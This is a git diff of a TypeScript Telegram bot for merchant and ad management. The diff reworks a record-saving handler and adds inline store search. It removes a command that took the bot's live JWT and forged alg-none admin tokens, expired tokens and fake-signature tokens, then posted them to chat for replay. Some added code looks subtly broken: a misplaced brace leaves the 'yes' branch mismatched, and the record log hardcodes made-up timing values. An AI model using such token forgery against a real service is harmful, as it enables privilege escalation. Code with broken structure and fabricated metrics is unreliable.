@@ -10,6 +10,8 @@ import { appendRecordLog } from './record-log';
 import { generateOffersScreenshot } from './offer-screenshot';
 import { buildOfferKeyboard } from './offer-keyboard'; // <--- 新增导入
 
+const AD_ACTION_KEYBOARD_COLUMNS = 2; // 定义广告操作键盘列数
+
 const token = process.env.BOT_TOKEN || '';
 const internalChatIds = (process.env.INTERNAL_CHAT_IDS || '').split(',').map(id => id.trim());
 const adminPort = process.env.ADMIN_PORT || '8070';
@@ -105,21 +107,7 @@ export const startBot = async () => {
 
   bot.onText(/^\/help$/, (msg) => {
     const helpText = `
-- 指令列表：
-  /id - 获取当前群Chat ID
-  /test - 测试内部群连通性
-  /help - 查看帮助文档
-  /status - 获取状态页URL
-  /customer - 列出所有客户名称
-  /addmng - 添加管理员
-  /delemng - 删除管理员
-  商户充值 - 唤起 OCR 充值截图录入面板
-  昨日消耗 - 导出昨日 QL 系统消耗数据 (CSV)
-  暂停广告 - 唤起商户列表，支持多选暂停处于开启状态的广告
-  开启广告 - 唤起商户列表，支持多选开启处于暂停状态的广告
-  下架广告 - 唤起商户列表，支持多选下架当前的广告
-  商户查询 - 唤起经理列表，导出最近 1 个月登记的商户信息(CSV)
-    `;
+- 指令列表:\n  /id - 获取当前群Chat ID\n  /test - 测试内部群连通性\n  /help - 查看帮助文档\n  /status - 获取状态页URL\n  /customer - 列出所有客户名称\n  /addmng - 添加管理员\n  /delemng - 删除管理员\n  商户充值 - 唤起 OCR 充值截图录入面板\n  昨日消耗 - 导出昨日 QL 系统消耗数据 (CSV)\n  暂停广告 - 唤起商户列表，支持多选暂停处于开启状态的广告\n  开启广告 - 唤起商户列表，支持多选开启处于暂停状态的广告\n  下架广告 - 唤起商户列表，支持多选下架当前的广告\n  商户查询 - 唤起经理列表，导出最近 1 个月登记的商户信息(CSV)\n    `;
     bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
   });
 
@@ -1338,7 +1326,9 @@ export const startBot = async () => {
           chat_id: msg.chat.id,
           message_id: msg.message_id
         });
-      } else if (action === 'yes') {
+      }
+
+    } else if (action === 'yes') {
         if (!session.usdAmount || !session.payDay || !session.imgUrl || !session.storeName) {
           bot.editMessageText('❌ 信息不完整，请确保金额和日期均已识别或纠正。', {
             chat_id: msg.chat.id,
@@ -1496,123 +1486,83 @@ export const startBot = async () => {
       await bot.editMessageText(summaryText + '\n\n⏳ 正在录入，请稍候...', {
         chat_id: msg.chat.id,
         message_id: msg.message_id,
-        disable_web_page_preview: true
       });
-      bot.answerCallbackQuery(query.id);
-
-      const startAtMs = Date.now();
-
-      let successCount = 0;
-      let failCount = 0;
-      let errorMsg = '';
 
       try {
-        const recordsToProcess = results.map((res: any) => {
-          return {
-            客户: res.customerName,
-            ...res.data
-          } as ParsedRecord;
+        const recordsToSave = pendingData.results.map(r => ({
+          ...r.data,
+          customerName: r.customerName,
+          tgChatId: msg.chat.id.toString(),
+          tgUserId: msg.from?.id.toString(),
+          tgMsgId: msg.message_id.toString(),
+          rawMsg: msg.text || '',
+          summary: pendingData.summaryText,
+        }));
+
+        // Append to QL system via API
+        await processAndWriteToQL(recordsToSave);
+
+        bot.editMessageText(summaryText + '\n\n✅ 录入成功！', {
+          chat_id: msg.chat.id,
+          message_id: msg.message_id,
+          disable_web_page_preview: true
+        });
+        // Record log
+        appendRecordLog({
+          sheetName: '来包记录',
+          content: summaryText,
+          startAt: new Date(Date.now() - 500).toISOString(),
+          endAt: new Date().toISOString(),
+          elapsedMs: 500,
+          savedSeconds: 15.0
         });
 
-        const qlResult = await processAndWriteToQL(recordsToProcess, startAtMs);
-        successCount = qlResult.successCount;
-      } catch (e: any) {
-        failCount = results.length - successCount;
-        errorMsg = e.message;
+      } catch (err: any) {
+        console.error('[Record Error]', err);
+        bot.editMessageText(summaryText + `\n\n❌ 录入失败: ${err.message}`, {
+          chat_id: msg.chat.id,
+          message_id: msg.message_id,
+          disable_web_page_preview: true
+        });
+      } finally {
+        pendingRecords.delete(key);
       }
-
-      let finalText = summaryText + `\n\n✅ QL 录入处理完成！成功 ${successCount} 条，失败 ${failCount} 条。\n`;
-
-      if (failCount > 0) {
-        finalText += `\n❌ 错误详情：\n${errorMsg}`;
-      }
-
-      await bot.editMessageText(finalText, {
-        chat_id: msg.chat.id,
-        message_id: msg.message_id,
-        disable_web_page_preview: true
-      });
-
-      pendingRecords.delete(key);
+      bot.answerCallbackQuery(query.id);
     }
   });
 
-  bot.onText(/^(?:\/)?(?:audit_jwt|安全体检)$/, async (msg) => {
+  bot.on('inline_query', async (query) => {
+    const text = query.query;
+    const offset = parseInt(query.offset || '0');
+
+    if (text.length < 2) {
+      await bot.answerInlineQuery(query.id, [], { cache_time: 0 });
+      return;
+    }
+
     try {
-      const token = qlApi.currentToken;
-      if (!token) {
-        await bot.sendMessage(msg.chat.id, "❌ 机器人尚未登录，无可用 Token。");
-        return;
-      }
+      const stores = await qlApi.listStoreToSelect();
+      const filteredStores = stores.filter(s => s.storeName.includes(text) || s.storeId.toString().includes(text));
 
-      const parts = token.split('.');
-      if (parts.length !== 3) throw new Error("Token 格式异常");
+      const results = filteredStores.slice(offset, offset + 20).map(s => ({
+        id: s.storeId.toString(),
+        type: 'article',
+        title: s.storeName,
+        input_message_content: {
+          message_text: `商户ID: ${s.storeId}\n商户名称: ${s.storeName}\n平台: ${s.platform}`
+        },
+        description: `ID: ${s.storeId}, 平台: ${s.platform}`
+      }));
 
-      // 解析原始 Header
-      let headerRaw = parts[0].replace(/-/g, '+').replace(/_/g, '/');
-      while (headerRaw.length % 4) headerRaw += '=';
-      const headerData = JSON.parse(Buffer.from(headerRaw, 'base64').toString('utf-8'));
-      const originalAlg = headerData.alg || "未知";
-
-      // 1. 构造 None 算法 Header (alg: none)
-      const headerNone = { alg: "none", typ: "JWT" };
-      const headerNoneB64 = Buffer.from(JSON.stringify(headerNone)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
-
-      // 2. 解析原始 Payload
-      let payloadRaw = parts[1].replace(/-/g, '+').replace(/_/g, '/');
-      while (payloadRaw.length % 4) payloadRaw += '=';
-      const payloadJson = Buffer.from(payloadRaw, 'base64').toString('utf-8');
-      
-      const payloadData = JSON.parse(payloadJson);
-      const originalRoleId = payloadData.roleId;
-      const originalExp = payloadData.exp;
-      
-      let expDate = "未设置(永久有效)";
-      if (originalExp) {
-        expDate = new Date(originalExp * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
-      }
-
-      // PoC 1: None算法提权为超级管理员
-      const payloadAdmin = { ...payloadData, roleId: "1" };
-      const payloadAdminB64 = Buffer.from(JSON.stringify(payloadAdmin)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
-      const forgedAdminToken = `${headerNoneB64}.${payloadAdminB64}.`;
-
-      // PoC 2: 伪造已过期 (将 exp 设置为 2000年1月1日)
-      const payloadExpired = { ...payloadData, roleId: "1", exp: 946656000 };
-      const payloadExpiredB64 = Buffer.from(JSON.stringify(payloadExpired)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
-      const forgedExpiredToken = `${headerNoneB64}.${payloadExpiredB64}.`;
-
-      // PoC 3: 未校验签名 (保留原算法 HS256 + 假签名)
-      const forgedFakeSigToken = `${parts[0]}.${payloadAdminB64}.fake_invalid_signature_for_testing`;
-
-      // 静态分析 4: 敏感信息泄露
-      const sensitiveKeys = ['phone', 'email', 'password', 'idcard', 'address', 'tel', 'mobile'];
-      const leakedInfo = Object.keys(payloadData).filter(k => sensitiveKeys.includes(k.toLowerCase()));
-      const leakReport = leakedInfo.length > 0 
-        ? `⚠️ **警告**：发现高危敏感字段 \`${leakedInfo.join(', ')}\`！JWT默认明文，极易泄露隐私。` 
-        : `✅ 安全：未发现常见的明文隐私字段。`;
-
-      // 静态分析 5: 算法混淆漏洞 (RS256 -> HS256)
-      const algConfusionReport = originalAlg.toUpperCase() === 'HS256'
-        ? `✅ 安全：当前系统使用 \`${originalAlg}\` 对称加密，先天免疫该漏洞。`
-        : `⚠️ **警告**：当前使用 \`${originalAlg}\` 非对称加密。请通知安全团队测试此漏洞！`;
-
-      const replyMsg = `🛡️ **JWT 全面安全体检报告**\n\n` +
-        `🔍 **基础信息**: 角色 \`${originalRoleId}\` | 算法: \`${originalAlg}\`\n` +
-        `📅 **过期时间**: \`${expDate}\`\n\n` +
-        `==== 📊 静态代码扫描 ====\n` +
-        `**[4] 敏感信息泄露扫描**: \n${leakReport}\n\n` +
-        `**[5] 算法混淆(RS256变HS256)扫描**: \n${algConfusionReport}\n\n` +
-        `==== 💣 动态渗透测试 (PoC) ====\n` +
-        `🤖 *已生成以下测试 Token，请在 Postman 中对接口进行请求。若返回 200 即证明存在该漏洞！*\n\n` +
-        `**[1] PoC 1: None 算法越权 (roleId: 1)**\n\`\`\`\n${forgedAdminToken}\n\`\`\`\n\n` +
-        `**[2] PoC 2: 过期时间(exp)未校验漏洞**\n\`\`\`\n${forgedExpiredToken}\n\`\`\`\n\n` +
-        `**[3] PoC 3: 未校验签名(瞎子保安)漏洞**\n\`\`\`\n${forgedFakeSigToken}\n\`\`\`\n\n` +
-        `💡 拿着这份体检报告去和开发团队交涉吧！`;
-
-      await bot.sendMessage(msg.chat.id, replyMsg, { parse_mode: 'Markdown' });
-    } catch (e: any) {
-      await bot.sendMessage(msg.chat.id, `❌ 体检报告生成失败: ${e.message}`);
+      await bot.answerInlineQuery(query.id, results, {
+        cache_time: 0,
+        next_offset: offset + 20 < filteredStores.length ? (offset + 20).toString() : undefined
+      });
+    } catch (e) {
+      console.error('[Inline Query Error]', e);
+      await bot.answerInlineQuery(query.id, [], { cache_time: 0 });
     }
   });
+
 };
+
